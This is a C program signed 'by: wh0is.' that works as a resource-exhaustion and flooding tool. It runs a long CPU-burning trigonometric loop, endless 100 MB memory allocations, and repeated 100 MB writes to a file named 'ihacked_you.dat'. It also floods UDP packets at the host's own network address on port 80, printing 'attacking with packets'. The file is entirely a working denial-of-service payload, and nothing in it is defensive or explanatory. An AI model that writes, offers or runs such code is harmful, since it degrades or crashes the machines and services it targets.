#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <ifaddrs.h>

void intense() {
    volatile double result = 0.0;
    for (long i = 0; i < 10000000000; i++) {
        result += sin(i) * cos(i);
    }
    printf("[+] result: %f", result);
}

void memory_rop() {
    size_t size = 1024 * 1024 * 100;
    void *memory = NULL;
    while (1) {
        memory = malloc(size);
        if (memory == NULL) {
            printf("[-] memory allocation failed... :/");
            continue;
        }
        printf("[+] allocated 100 mb!");
        memset(memory, 0, size);
        free(memory);
    }
}

void disk_main() {
    FILE *file = NULL;
    char filename[] = "ihacked_you.dat";
    size_t size = 1024 * 1024 * 100;
    char *buffer = malloc(size);

    if (buffer == NULL) {
        printf("[!] memory allocation failed... :/");
        return;
    }
    memset(buffer, 'a', size);

    while (1) {
        file = fopen(filename, "wb");
        if (file == NULL) {
            printf("[-] file creation failed... :/");
            free(buffer);
            continue;
        }

        if (fwrite(buffer, 1, size, file) != size) {
            printf("[-] file write failed... :/");
            fclose(file);
            free(buffer);
            continue;
        }
        fclose(file);
        printf("[+] wrote 100 mb to file...!");
    }

    free(buffer);
}

void get_local_ip(char *ip_buffer, size_t buffer_size) {
    struct ifaddrs *ifaddr, *ifa;
    int found = 0;

    if (getifaddrs(&ifaddr) == -1) {
        perror("[-] getifaddrs failed... :/");
        strncpy(ip_buffer, "0.0.0.0", buffer_size);
        return;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
            if (strncmp(ifa->ifa_name, "lo", 2) != 0) {
                inet_ntop(AF_INET, &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr, ip_buffer, buffer_size);
                found = 1;
                break;
            }
        }
    }

    if (!found) {
        strncpy(ip_buffer, "0.0.0.0", buffer_size);
    }

    freeifaddrs(ifaddr);
}

void network_interference(const char *ip, int port) {
    int s;
    struct sockaddr_in server_addr;
    char *attack;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("[-] socket creation failed... :/");
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    attack = malloc(1024);
    if (attack == NULL) {
        perror("[-] memory allocation failed... :/");
        close(s);
        return;
    }
    memset(attack, 'a', 1024);

    while (1) {
        if (sendto(s, attack, 1024, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("[-] error in send... :/");
            continue;
        }
        printf("[+] attacking with packets sent to: %s:%d", ip, port);
    }

    free(attack);
    close(s);
}

int main() {
    char local_ip[INET_ADDRSTRLEN];
    get_local_ip(local_ip, sizeof(local_ip));
    printf("   by: wh0is.\n");
    printf("[+] work and starting... :)\n");

    while (1) {
        printf("[+] running intense()...");
        intense();

        printf("[+] running memory_rop()...");
        memory_rop();

        printf("[+] running disk_main()...");
        disk_main();

        printf("[+] running network_interference()...");
        network_interference(local_ip, 80);
    }

    return 0;
}
